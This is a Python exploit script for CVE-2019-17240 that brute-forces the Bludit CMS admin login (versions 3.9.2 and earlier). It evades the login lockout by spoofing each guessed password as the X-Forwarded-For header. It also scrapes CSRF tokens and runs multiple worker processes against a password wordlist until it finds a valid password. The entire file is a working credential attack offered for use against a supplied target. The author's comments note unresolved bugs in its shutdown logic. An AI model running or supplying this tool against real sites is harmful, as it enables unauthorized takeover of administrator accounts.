#!/usr/bin/env python3

#CVE-2019-17240
#Bludit <= 3.9.2 Admin Portal login brute-force tool
#Need valid username to use

import multiprocessing
import sys
import time
from multiprocessing import Queue
import re
import requests

def worker(cred_queue):
    print('Starting new worker thread.')
    while True:
        try:
            password = cred_queue.get(timeout=10)
        except Queue.Empty:
            return 

        try:
            
                session = requests.Session()
                login_page = session.get(login_url)
                csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

                print('[*] Trying: {p}'.format(p = password))

                headers = {
                    'X-Forwarded-For': password,
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                    'Referer': login_url
                }

                data = {
                    'tokenCSRF': csrf_token,
                    'username': username,
                    'password': password,
                    'save': ''
                }

                login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

                if 'location' in login_result.headers:
                    if '/admin/dashboard' in login_result.headers['location']:
                        print()
                        print('SUCCESS: Password found!')
                        print('Use {u}:{p} to login.'.format(u = username, p = password))
                        print()
                        break
                        
        
        except Exception:
        #Make this exception more verbose and useful
            e = sys.exc_info()[2]
            print("Failed on: {0} {1}".format(password, str(e)))
            return

         #This is useful for rate-limiting. Uncomment to use.
#        time.sleep(.5)

    cleanup(procs)
    sys.exit()
    #For some reason I still can't get this to exit properly. 
    #TODO: Fix this to clean up all threads and exit gracefully upon success
    #below is the error output
    """
    Process Process-7:
    Traceback (most recent call last):
      File "/usr/lib/python3.8/multiprocessing/process.py", line 315, in _bootstrap
        self.run()
      File "/usr/lib/python3.8/multiprocessing/process.py", line 108, in run
        self._target(*self._args, **self._kwargs)
      File "bludit-3.9.2-bruteForce-multi.py", line 59, in worker
        cleanup(procs)
      File "bludit-3.9.2-bruteForce-multi.py", line 99, in cleanup
        p.join()
      File "/usr/lib/python3.8/multiprocessing/process.py", line 147, in join
        assert self._parent_pid == os.getpid(), 'can only join a child process'
    AssertionError: can only join a child process
    """
    

def file_to_list(wList):
    passlist= []
    #latin1 encoding is necessary to get `rockyou.txt` to work
    #this may cause problems with other wordlists
    #need to add check for encoding type on input file
    with open(wList, encoding='latin1') as wordList:
         templist = wordList.readlines()
         
         for word in templist:
             passlist.append(word.strip())

    return passlist


def cleanup(processes):
        # Wait for all worker processes to finish
    for p in processes:
        p.terminate()
        p.join()


if __name__ == '__main__':
    print("#CVE-2019-17240")
    print("#Bludit <= 3.9.2 Admin Portal login brute-force tool")
    if len(sys.argv) != 4:
        print('Usage: python3 bludit-3.9.2-bruteForce-multi.py http://<ip> <username> </path/to/wordlist>')
        sys.exit()

    host = sys.argv[1]
    login_url = host + '/admin/login'
    username = sys.argv[2]
    wordlist = sys.argv[3]
    threads = 10
    passwords = file_to_list(wordlist)

    cred_queue = multiprocessing.Queue()
    procs = []

    print('Starting {0} worker threads.'.format(threads))
    for i in range(threads):
        p = multiprocessing.Process(target=worker, args=(cred_queue, ))
        procs.append(p)
        p.start()
    
    print('Loading credential queue.')
    for pwd in passwords:
        cred_queue.put((pwd))
